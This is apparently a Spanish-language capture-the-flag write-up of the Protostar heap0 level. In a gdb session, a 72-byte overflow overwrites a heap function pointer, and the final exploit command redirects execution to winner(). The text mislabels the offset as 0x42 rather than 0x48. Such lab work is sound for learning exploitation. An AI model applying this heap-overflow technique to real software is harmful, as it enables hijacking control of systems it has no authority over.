Sobreescribimos EIP con 42424242==BBBB

(gdb) r $(python -c 'print "A"*72+"BBBB"')
Starting program: /opt/protostar/bin/heap0 $(python -c 'print "A"*72+"BBBB"')
data is at 0x804a008, fp is at 0x804a050

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/64x 0x804a008,
A syntax error in expression, near `'.
(gdb) x/64x 0x804a008
0x804a008:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a048:	0x41414141	0x41414141	0x42424242	0x00000000
0x804a058:	0x00000000	0x00020fa9	0x00000000	0x00000000


f->fp esta en 0x804a050. La diferencia entre esto y 0x804a008 son 0x42=72 Bytes de offset. 


(gdb) r $(python -c 'print "A"*72')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap0 $(python -c 'print "A"*72')
data is at 0x804a008, fp is at 0x804a050

Program received signal SIGSEGV, Segmentation fault.
0x08048418 in __do_global_dtors_aux ()
(gdb) x/64x 0x804a008
0x804a008:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a048:	0x41414141	0x41414141	0x08048400	0x00000000


Simplmente si sobreescribimos para que apunte EIP directamente a la funcion winner() ganamos!!!. La direccion de memoria es \x64\x84\x04\x08

(gdb) r $(python -c 'print "A"*72+"\x64\x84\x04\x08"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap0 $(python -c 'print "A"*72+"\x64\x84\x04\x08"')
data is at 0x804a008, fp is at 0x804a050
level passed

Program exited with code 015.


EXPLOIT:
user@protostar:/opt/protostar/bin$ ./heap0 $(python -c 'print "A"*72+"\x64\x84\x04\x08"')
data is at 0x804a008, fp is at 0x804a050
level passed
